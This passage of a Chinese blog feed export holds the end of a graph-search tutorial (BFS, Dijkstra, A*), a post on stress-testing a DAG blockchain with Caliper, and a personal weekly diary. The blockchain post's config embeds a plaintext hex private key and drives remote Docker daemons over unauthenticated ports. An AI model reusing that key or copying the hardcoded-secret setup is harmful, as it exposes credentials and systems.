src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-12.jpg#clientId=u4512e8b3-315c-4&from=paste&height=384&id=u4b228bb6&margin=%5Bobject%20Object%5D&originHeight=768&originWidth=752&originalType=url&status=done&style=none&taskId=uf69ba2e0-88b1-4285-8540-21d9787fb80&width=376"><br>从终点回溯，i 的父节点为 f，f 的父节点为 e，e 的父节点为 a，这样就可以得到 a 到 i 的最短路径为：a-&gt;e-&gt;f-&gt;i，如下<br><img src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-13.jpeg#clientId=u4512e8b3-315c-4&from=paste&height=200&id=u9d7c5033&margin=%5Bobject%20Object%5D&originHeight=399&originWidth=720&originalType=url&status=done&style=none&taskId=ube00c3d7-c002-4c0a-9de2-74816c1441b&width=360"><br>显而易见，相较于 DFS，BFS 中使用了大量的入队、出队操作，耗时增加，但是能保证找到最优路径。</p><h2 id="Dijkstra-算法"><a href="#Dijkstra-算法" class="headerlink" title="Dijkstra 算法"></a>Dijkstra 算法</h2><p>上面的算法中，只有广度优先搜索(BFS)具有完备性，能够保证搜索到最优路径。但是可以看到 BFS 算法搜索到的路径只有向上/下/左/右移动这四个动作，它们是没有权值或者说权值都相同的，只能用于无权图的路径规划，无法实现能够对角移动的路径规划。因此下面介绍一种能用于带权图的图搜索算法——Dijkstra 算法(狄克斯特拉算法)。<br>Dijkstra 算法是从一个顶点到其余各顶点的最短路径算法，其流程仍然与上述算法基本一致，它也是用优先队列作为 openlist 的数据结构，它和 GBFS 的区别在于代价函数<img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620723691035-98fc7aa9-f863-4712-bac3-8f57411585e6.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=u28f910d0&margin=%5Bobject%20Object%5D&originHeight=26&originWidth=40&originalType=url&status=done&style=none&taskId=uabd98f3e-5132-480c-8650-2d94afd29b4&width=20">的定义，Dijkstra 算的<img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620723691113-2bf1da8e-b611-4885-a7f1-04164c40d237.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=ubf3cbf54&margin=%5Bobject%20Object%5D&originHeight=26&originWidth=40&originalType=url&status=done&style=none&taskId=ufbbe61e2-28bc-45d0-b633-061774a7863&width=20">定义为：<br><img src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-14.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=uc782ed82&margin=%5Bobject%20Object%5D&originHeight=26&originWidth=107&originalType=url&status=done&style=none&taskId=u79b0ef1e-5762-4b77-8b5b-162e6ba7aa0&width=53.5"><br>其中<img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620723690991-a4dc7fa7-b40f-4515-b86e-7febdfd73f37.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=u4bc7f663&margin=%5Bobject%20Object%5D&originHeight=26&originWidth=39&originalType=url&status=done&style=none&taskId=u82673318-68cb-422c-b8b2-88439071c0e&width=19.5">表示<strong>从起点到当前点的移动代价</strong>。<br>作者：鬼木士链接：<a href="https://zhuanlan.zhihu.com/p/346666812%E6%9D%A5%E6%BA%90%EF%BC%9A%E7%9F%A5%E4%B9%8E%E8%91%97%E4%BD%9C%E6%9D%83%E5%BD%92%E4%BD%9C%E8%80%85%E6%89%80%E6%9C%89%E3%80%82%E5%95%86%E4%B8%9A%E8%BD%AC%E8%BD%BD%E8%AF%B7%E8%81%94%E7%B3%BB%E4%BD%9C%E8%80%85%E8%8E%B7%E5%BE%97%E6%8E%88%E6%9D%83%EF%BC%8C%E9%9D%9E%E5%95%86%E4%B8%9A%E8%BD%AC%E8%BD%BD%E8%AF%B7%E6%B3%A8%E6%98%8E%E5%87%BA%E5%A4%84%E3%80%82">https://zhuanlan.zhihu.com/p/346666812来源：知乎著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</a><br>以下图为例，计算起点 a 到终点 i 的最短路径，箭头上的数值表示<strong>两个节点间的距离</strong><br><img src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-15.jpg#clientId=u4512e8b3-315c-4&from=paste&height=138&id=uce92bbd0&margin=%5Bobject%20Object%5D&originHeight=275&originWidth=369&originalType=url&status=done&style=none&taskId=u1b2110ca-eadb-4f25-8e5d-d5865274f54&width=184.5"><br>首先扩展第一个节点，计算其余节点与第一个节点的距离，用橙色标出已经扩展的节点，未扩展的节点仍用绿色标出，其中圆中的数值表示<strong>该节点的代价函数</strong>，字母则表示该节点没有直接到达此时已扩展节点的路径。从未扩展的节点(绿色节点)中选择代价函数最小的节点进行拓展，并更新其余节点的代价函数，如下图<br><img src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-16.jpg#clientId=u4512e8b3-315c-4&from=paste&height=137&id=uc0f1683a&margin=%5Bobject%20Object%5D&originHeight=274&originWidth=1124&originalType=url&status=done&style=none&taskId=u8a1450f1-79f9-4399-8f8d-e169c2c3ede&width=562"><br>重复进行上面的步骤，直到所有节点都已扩展。<br><img src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-17.jpeg#clientId=u4512e8b3-315c-4&from=paste&height=270&id=u45e4071d&margin=%5Bobject%20Object%5D&originHeight=539&originWidth=720&originalType=url&status=done&style=none&taskId=ud51a5969-c955-4e39-8e84-4a846498db9&width=360"><br>最后标出起点到终点的最短路径<br><img src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-18.png#clientId=u4512e8b3-315c-4&from=paste&height=137&id=u56f0c87f&margin=%5Bobject%20Object%5D&originHeight=274&originWidth=369&originalType=url&status=done&style=none&taskId=ua013e2b8-7911-432c-a37e-57920b0aa19&width=184.5"></p><h2 id="A-算法"><a href="#A-算法" class="headerlink" title="A*算法"></a>A*算法</h2><p>对比 GBFS 和 Dijkstra 算法，两者都采用优先队列作为 openlist，而代价函数的不同导致两者具有不同的优点：GBFS 用节点到目标点的距离作为代价函数，将搜索方向引向目标点，搜索效率高；而 Dijkstra 算法采用起点到当前扩展节点的移动代价作为代价函数，能够确保路径最优。<br>那么可不可以将两者的代价函数进行融合，从而<strong>在保证路径最优的同时提高搜索效率</strong>？答案是肯定的，融合后的算法就是<strong>A*算法</strong>。<br>A<em>算法也是一种启发式算法，它的代价函数表示为：<br><img src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-19.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=u5a11f40f&margin=%5Bobject%20Object%5D&originHeight=26&originWidth=174&originalType=url&status=done&style=none&taskId=u6444210b-d148-4737-8444-6e7a899159f&width=87"><br>其中 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725031612-4bb2e537-3a2a-43f0-9430-720081543412.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=ua1c55913&margin=%5Bobject%20Object%5D&originHeight=26&originWidth=39&originalType=url&status=done&style=none&taskId=u81437d7e-75f3-4519-8ad2-3f4d8947340&width=19.5"> 为起点到当前扩展节点的移动代价函数， <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725031588-880c54fd-53e9-4a32-ae42-9b033a83bcc7.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=u2774a467&margin=%5Bobject%20Object%5D&originHeight=26&originWidth=41&originalType=url&status=done&style=none&taskId=u26212a94-ede6-4884-b185-f79bf3560b3&width=20.5"> 是启发函数，用节点到目标点的距离函数来表示。<br>根据这个式子，可以得到 A</em>算法的几个特点：</p><ul><li>如果令 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725031585-3ccd0531-4927-431f-bb82-79cc2f0029e8.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=u734ded48&margin=%5Bobject%20Object%5D&originHeight=26&originWidth=79&originalType=url&status=done&style=none&taskId=u1854bd03-0452-47f9-9cb0-a773eb37eb7&width=39.5"> ，A<em>算法就退化为 Dijkstra 算法；如果令 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725031585-161dbbd5-4e20-44d9-b575-43d61c553747.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=u1cba9235&margin=%5Bobject%20Object%5D&originHeight=26&originWidth=77&originalType=url&status=done&style=none&taskId=u1149f333-b9a7-4bf2-a3f1-b93cd429b0c&width=38.5">_，_A</em>算法就退化为 GBFS 算法。</li><li>能否找到最优路径的关键是启发函数 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725036315-f0c86fa9-aa76-4298-a880-bf792907b269.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=u2e57cf76&margin=%5Bobject%20Object%5D&originHeight=26&originWidth=41&originalType=url&status=done&style=none&taskId=u2548ee5d-b15d-4954-9fe6-004bffcb214&width=20.5"> 的选取，如果 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725036325-3ea21fc5-28b7-4eca-8740-e12dce2238c8.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=u7c5a7978&margin=%5Bobject%20Object%5D&originHeight=26&originWidth=41&originalType=url&status=done&style=none&taskId=u0f640d4a-3324-49b1-8fee-a3ec3ce5d3e&width=20.5"> 在大部分情况下比从当前节点到目标点的移动代价小，则能找到最优路径。</li><li>由于 A* 算法的启发函数是位置上的距离，因此在不带位置信息的图数据中不适用。</li></ul>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
      <category>图论</category>
      
    </categories>
    
    
    <tags>
      
      <tag>图搜索算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>区块链性能测试</title>
    <link href="/2021/05/06/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95_new/"/>
    <url>/2021/05/06/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95_new/</url>
    
    <content type="html"><![CDATA[<p>对区块链进行性能测试</p><a id="more"></a><h1 id="现状"><a href="#现状" class="headerlink" title="现状"></a>现状</h1><p>目前，主流平台基本支持 Caliper 压力测试。<br>官方文档：<br>【1】<a href="https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/articles/4_tools/46_stresstest/caliper_stress_test_practice.html">性能压测工具 Caliper 在 FISCO BCOS 平台中的实践</a><br>【2】<a href="https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/tutorial/stress_testing.html#caliper">通过 Caliper 进行压力测试程序</a><br>其他个人业务 demo：<br>【1】<a href="https://blog.csdn.net/manok/article/details/82084852">基于区块链技术的性能测试</a><br>【2】<a href="https://bbs.huaweicloud.com/blogs/204653">基于 Fabric 的性能测试与调优实践</a><br>【3】<a href="https://www.infoq.cn/article/block-chain-practice">区块链性能测评实战案例</a></p><p>其他 web 服务器测压思路比如，Apachebench，redisbench，wrk</p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><ol><li>网络配置</li><li>设备配置</li><li>redis 截图<ol><li>查询性能</li><li>共识性能</li></ol></li><li>见本子</li></ol><h1 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h1><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;test&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;blockchain&quot;</span>: <span class="hljs-string">&quot;block-dag&quot;</span>,<br>    <span class="hljs-attr">&quot;command&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;start&quot;</span>: <span class="hljs-string">&quot;sh block-dag/stress-testing/start.sh&quot;</span>,<br>      <span class="hljs-attr">&quot;end&quot;</span>: <span class="hljs-string">&quot;sh block-dag/stress-testing/end.sh&quot;</span><br>    &#125;<br>  &#125;,<br>  <span class="hljs-attr">&quot;minner&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;config&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;privateKey&quot;</span>: <span class="hljs-string">&quot;bcec428d5205abe0f0cc8a734083908d9eb8563e31f943d760786edf42ad67dd&quot;</span>,<br>      <span class="hljs-attr">&quot;account&quot;</span>: <span class="hljs-string">&quot;0x64fa644d2a694681bd6addd6c5e36cccd8dcdde3&quot;</span><br>    &#125;,<br>    <span class="hljs-attr">&quot;network&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;nodes&quot;</span>: [<br>        &#123;<br>          <span class="hljs-attr">&quot;ip&quot;</span>: <span class="hljs-string">&quot;192.168.1.1&quot;</span>,<br>          <span class="hljs-attr">&quot;rpcPort&quot;</span>: <span class="hljs-string">&quot;6001&quot;</span>,<br>          <span class="hljs-attr">&quot;channelPort&quot;</span>: <span class="hljs-string">&quot;9001&quot;</span><br>        &#125;,<br>        &#123;<br>          <span class="hljs-attr">&quot;ip&quot;</span>: <span class="hljs-string">&quot;192.168.1.2&quot;</span>,<br>          <span class="hljs-attr">&quot;rpcPort&quot;</span>: <span class="hljs-string">&quot;6001&quot;</span>,<br>          <span class="hljs-attr">&quot;channelPort&quot;</span>: <span class="hljs-string">&quot;9001&quot;</span><br>        &#125;,<br>        &#123;<br>          <span class="hljs-attr">&quot;ip&quot;</span>: <span class="hljs-string">&quot;192.168.1.3&quot;</span>,<br>          <span class="hljs-attr">&quot;rpcPort&quot;</span>: <span class="hljs-string">&quot;6001&quot;</span>,<br>          <span class="hljs-attr">&quot;channelPort&quot;</span>: <span class="hljs-string">&quot;9001&quot;</span><br>        &#125;<br>      ],<br>      <span class="hljs-attr">&quot;authentication&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;key&quot;</span>: <span class="hljs-string">&quot;block-dag/stress-testing/sdk/node.key&quot;</span>,<br>        <span class="hljs-attr">&quot;cert&quot;</span>: <span class="hljs-string">&quot;block-dag/stress-testing/sdk/node.crt&quot;</span>,<br>        <span class="hljs-attr">&quot;ca&quot;</span>: <span class="hljs-string">&quot;block-dag/stress-testing/sdk/ca.crt&quot;</span><br>      &#125;,<br>      <span class="hljs-attr">&quot;timeout&quot;</span>: <span class="hljs-number">900000</span><br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>command.start</strong><br>首先执行 start 配置中指定的命令，主要用于使用 Docker 模式启动，启动 Caliper 时首先执行当前目录下的 start.sh 文件，其具体内容是：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker -H 192.168.1.1:6001 run -d --rm --name node0 -v /data/test/node0/:/data -p 8000:8000 -p 20914:20914 -p 9001:9001 -w=/data dag/blockdag:latest -c config.ini 1&gt; /dev/null<br>docker -H 192.168.1.2:6001 run -d --rm --name node1 -v /data/test/node0/:/data -p 8000:8000 -p 20914:20914 -p 9001:9001 -w=/data dag/blockdag:latest -c config.ini 1&gt; /dev/null<br>docker -H 192.168.1.3:6001 run -d --rm --name node2 -v /data/test/node0/:/data -p 8000:8000 -p 20914:20914 -p 9001:9001 -w=/data dag/blockdag:latest -c config.ini 1&gt; /dev/null<br></code></pre></td></tr></table></figure><p>即启动远程的 Docker 容器。<br><strong>command.end</strong><br>Caliper 在退出流程的最后会执行 end 配置指定的命令，主要用于清理环境。本例中在测试结束时会执行当前目录下的 end.sh 文件，其具体内容是：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker -H 192.168.1.1:6001 stop $(docker -H 192.168.1.1:6001 ps -a | grep node0 | cut -d &quot; &quot; -f 1) 1&gt; /dev/null &amp;&amp; echo -e &quot;\033[32mremote container node0 stopped\033[0m&quot;<br>docker -H 192.168.1.2:6001 stop $(docker -H 192.168.1.2:6001 ps -a | grep node1 | cut -d &quot; &quot; -f 1) 1&gt; /dev/null &amp;&amp; echo -e &quot;\033[32mremote container node1 stopped\033[0m&quot;<br>docker -H 192.168.1.3:6001 stop $(docker -H 192.168.1.3:6001 ps -a | grep node2 | cut -d &quot; &quot; -f 1) 1&gt; /dev/null &amp;&amp; echo -e &quot;\033[32mremote container node2 stopped\033[0m&quot;<br></code></pre></td></tr></table></figure><p>即停止并删除有所的远程容器。<br><strong>network.nodes</strong><br>一个包含了所有要连接节点的列表，列表中每一项需要指明被连接节点的 IP 地址、RPC 端口及 Channel 端口号，所有端口号需要和节点的配置文件保持一致。<br><strong>network.authentication</strong><br>适配器向节点的 Channel 端口发起请求时需要使用 CA 根证书等文件，这些文件已在 3.1.2 节中调用 build_chain.sh 脚本时已经生成好，使用任一节点配置下的 sdk 文件夹中的相应文件即可，需要在该配置中写上所有文件的路径。</p><h1 id="测试配置"><a href="#测试配置" class="headerlink" title="测试配置"></a>测试配置</h1><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">test:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">stress</span> <span class="hljs-string">test</span><br>  <span class="hljs-attr">description:</span> <span class="hljs-string">This</span> <span class="hljs-string">is</span> <span class="hljs-string">a</span> <span class="hljs-string">stress</span> <span class="hljs-string">testing</span> <span class="hljs-string">of</span> <span class="hljs-string">Block</span> <span class="hljs-string">DAG.</span><br>  <span class="hljs-attr">clients:</span><br>    <span class="hljs-attr">type:</span> <span class="hljs-string">local</span><br>    <span class="hljs-attr">number:</span> <span class="hljs-number">1</span><br>  <span class="hljs-attr">rounds:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">label:</span> <span class="hljs-string">create</span><br>      <span class="hljs-attr">description:</span> <span class="hljs-string">Test</span> <span class="hljs-string">performance</span> <span class="hljs-string">of</span> <span class="hljs-string">creating</span> <span class="hljs-string">txs</span><br>      <span class="hljs-attr">txNumber:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-number">15000</span><br>      <span class="hljs-attr">callback:</span> <span class="hljs-string">block-dag/stress-testing/create.js</span><br><span class="hljs-attr">monitor:</span><br>  <span class="hljs-attr">type:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">docker</span><br>  <span class="hljs-attr">docker:</span><br>    <span class="hljs-attr">name:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">http://192.168.1.1:6001</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">http://192.168.1.2:6001</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">http://192.168.1.3:6001</span><br>  <span class="hljs-attr">interval:</span> <span class="hljs-number">0.1</span><br></code></pre></td></tr></table></figure><p>测试文件中主要包括两部分：</p><ul><li>测试内容配置</li></ul><p>test 项负责对测试内容进行配置。配置主要集中在 round 字段中指定如何对区块链系统进行测试。每一个测试可以包含多轮，每一轮可以向区块链发起不同的测试请求。<br>本次测试是对系统的 createTx 接口进行测试。在测试中，可以通过 txNumber 字段指定测试的交易发送数量</p><ul><li>性能监视器配置</li></ul><p>monitor 项负责对测试所使用的性能监视器的进行配置。每项配置项的解释如下：</p><ol><li>monitor.type，需要指定为 docker，指对 docker 容器进行监控；</li><li>monitor.docker.name，一个包含所有要监视的节点的 docker 容器名称列表；</li><li>monitor.interval，监视器的采样间隔，单位为秒。</li></ol><h1 id="实际测试"><a href="#实际测试" class="headerlink" title="实际测试"></a>实际测试</h1><p>实际测试中，我选择类似 Apache 的测试结果。<br>全是正常交易</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Tx Length:</span> <span class="hljs-number">217088</span> <span class="hljs-string">bytes</span>       <span class="hljs-string">交易数据的长度</span><br><span class="hljs-attr">Total Txs Number:</span> <span class="hljs-number">15000</span><br><span class="hljs-attr">Time taken for tests:</span> <span class="hljs-number">5.919</span> <span class="hljs-string">seconds</span>    <span class="hljs-string">所有这些交易发送完所花费的时间</span><br><span class="hljs-attr">Complete requests:</span> <span class="hljs-number">15000</span>             <span class="hljs-string">完成请求数</span><br><span class="hljs-attr">Failed requests:</span> <span class="hljs-number">0</span>                <span class="hljs-string">失败请求数</span><br><span class="hljs-attr">Write errors:</span> <span class="hljs-number">0</span><br><span class="hljs-attr">Total transferred:</span> <span class="hljs-number">3256320000</span> <span class="hljs-string">bytes</span>     <span class="hljs-string">网络总传输量</span><br><span class="hljs-attr">TPS:</span> <span class="hljs-number">2536.3</span> [<span class="hljs-comment">#/sec] (mean) 吞吐量-每秒交易数</span><br><span class="hljs-attr">Time per request:</span> <span class="hljs-number">1.513</span> [<span class="hljs-string">ms</span>] <span class="hljs-string">(mean</span>, <span class="hljs-string">across</span> <span class="hljs-string">all</span> <span class="hljs-string">concurrent</span> <span class="hljs-string">requests)</span> <span class="hljs-string">并发的每个请求平均消耗时间</span><br><span class="hljs-attr">Transfer rate:</span> <span class="hljs-number">67.15</span> [<span class="hljs-string">Mbytes/sec</span>] <span class="hljs-string">received</span> <span class="hljs-string">平均每秒网络上的流量，可以帮助排除是否存在网络流量过大导致响应时间延长的问题</span><br></code></pre></td></tr></table></figure><p>说明:<br>Tx 长度为 212 kb，换算为字节是 217088 bytes</p><blockquote><p>用 nodejs 打印上述结果</p></blockquote><p><img src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-1.png#clientId=ue0d8159d-8879-4&from=paste&height=269&id=uf8e241e5&margin=%5Bobject%20Object%5D&name=image.png&originHeight=538&originWidth=854&originalType=binary&size=66022&status=done&style=none&taskId=ua2f5d267-1fbc-46ce-a75d-7e48fa43834&width=427" alt="image.png"><br>打印区块<br>getMaxHeightBlock 接口–最高块<br><img src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-2.png#clientId=ue0d8159d-8879-4&from=paste&height=302&id=udab02a53&margin=%5Bobject%20Object%5D&name=image.png&originHeight=599&originWidth=978&originalType=binary&size=115789&status=done&style=none&taskId=u2ed02707-9654-4dfb-8fb5-77517ad6a23&width=493" alt="image.png"><br><img src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-3.png#clientId=ue0d8159d-8879-4&from=paste&height=348&id=ubdbcfa19&margin=%5Bobject%20Object%5D&name=image.png&originHeight=679&originWidth=909&originalType=binary&size=108543&status=done&style=none&taskId=u82ff9afe-2c69-4356-9d50-5d83d492427&width=465.5" alt="image.png"><br>这里注意到，每个块包含 60 个交易，60*95=5700&gt;3000（为平均每节点分配到的交易量），这里存在几种原因：<br>① 在并发生成块的时候，由于节点间的速率差异与网络延迟而导致当时观察到的 Tip 集不同，而导致的区块高度高于预期高度。<br>② 由于处理交易的时候对于放在交易缓存池中的未打包交易进行转发操作，并标记为未打包，导致其中的一些交易被不同的节点重复打包，而导致打包交易量大于预期。</p><p>解释各个字段的含义</p><p>再通过 rpc 端口查询每个节点中各自存储的交易量<br>（发送 GET 请求到 channel 端口进行查询）</p><p><img src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-4.png#clientId=ue0d8159d-8879-4&from=paste&height=85&id=u7c0e6c3b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=169&originWidth=808&originalType=binary&size=23484&status=done&style=none&taskId=u8db7b66d-e3cc-446c-ae3b-7416ee176a8&width=404" alt="image.png"><br><img src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-5.png#clientId=ue0d8159d-8879-4&from=paste&height=81&id=ud52b21b6&margin=%5Bobject%20Object%5D&name=image.png&originHeight=162&originWidth=812&originalType=binary&size=23217&status=done&style=none&taskId=u0c59e8b2-326d-4414-b250-f3334c30c2e&width=406" alt="image.png"><br><img src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-6.png#clientId=ue0d8159d-8879-4&from=paste&height=85&id=ue659a490&margin=%5Bobject%20Object%5D&name=image.png&originHeight=169&originWidth=805&originalType=binary&size=24212&status=done&style=none&taskId=u667e9356-a241-4ac0-9ab5-3676f248e40&width=402.5" alt="image.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>生活周报-May-3-to-10</title>
    <link href="/2021/05/04/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-May-3-to-10_new/"/>
    <url>/2021/05/04/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-May-3-to-10_new/</url>
    
    <content type="html"><![CDATA[<h1 id="时讯"><a href="#时讯" class="headerlink" title="时讯"></a>时讯</h1><ol><li>五四青年节，知乎发布微电影《重逢》，讲述了关于肖思远烈士的事，回答了这样一个时代问题——“当代年轻人还有没有不计生死的热血”，我没有看影片，只看了些许回答就已经泣不成声，酸楚涌上心头，豆大的眼泪滴落许久。是的，我在床上浏览着手机，这和平的岁月，都是这群最可爱的人为我们负重前行换来的。身为青年一代，我何曾忘记报国之志，家国之情溢于言表，流淌着的热血，奔涌的黄河，人民在召唤，时代在召唤，吾辈当不负重任，砥砺前行。</li><li>B 站发布了新的演讲，这次的演讲十分淳朴，也十分有感染力，下面是演讲全文：</li></ol><p>那些想从我们身上 看到中国未来的人<br>亲爱的父母 师长 前辈<br>其实我还不知道 想成为什么样的人<br>但能和你们分享的是<br>我不想做什么样的人<br>我不想做一个拿着锯子的人<br>随时随地 把人群锯成两半<br>这一半是女人 那一半是男人<br>这一半是盟友 那一半是对手<br>对手赞同的我们必须反对<br>对手反对的我们必须赞同<br>不论对错 只争输赢<br>我不想做一个浑身带刺的人<br>嘲讽别人的成功 嘲笑别人的失败<br>看不惯过得比他好的人<br>看不起过得没他好的人<br>一肚子抱怨和借口<br>凡事不是自己的错 都是别人的错<br>我不想做一个 流水线上制造出来的人<br>没有独立的人格 只有预定的人设<br>没有闪光的才华 只有抛光的流量<br>没有精彩的作品 只有热闹的八卦<br>我不想做一个隐身的人<br>需要挺身而出的时候 他藏在人群里<br>需要解决问题的时候 他消失在所有人的视线里<br>我不想做一个油腻的人<br>你吃亏的时候他说吃亏是福<br>该较真的时候他说难得糊涂<br>是的，我不想做这样的人<br>我不想做一个没有同情心的人<br>一个不讲义气的人<br>一个没有教养的人<br>一个半途而废的人<br>一个遗忘历史的人<br>我不想 做一个不爱国的人<br>我不想做一个 口口声声 “一代不如一代”的人<br>当我变成父母 师长 前辈的时候<br>希望 我的孩子会对我说<br>我想成为你这样的人。</p><ol start="3"><li>盖茨离婚</li><li>狗狗币暴涨 300 倍，炒币的世界我不懂。</li></ol><h1 id="小事"><a href="#小事" class="headerlink" title="小事"></a>小事</h1><ol><li>朋友送的糕点很好吃，在阳光天地的西木栗子有卖。</li><li>买了一只大吉岭的香水小样还不知道什么味道。–越闻越好闻，前调的烟草味有点大，中调很有感觉，是那种草木香气。</li><li>立夏了，气温开始在 30 度徘徊了。</li><li>买了嘉华鲜花饼，送给老妈当母亲节礼物，玫瑰馅的应该挺好吃的？</li><li>去看了牙，医生说智齿都要拔掉。</li><li>去咨询了一下正畸医生，不太敢正畸了。</li></ol><h1 id="本周收藏"><a href="#本周收藏" class="headerlink" title="本周收藏"></a>本周收藏</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><p>看知乎</p><h2 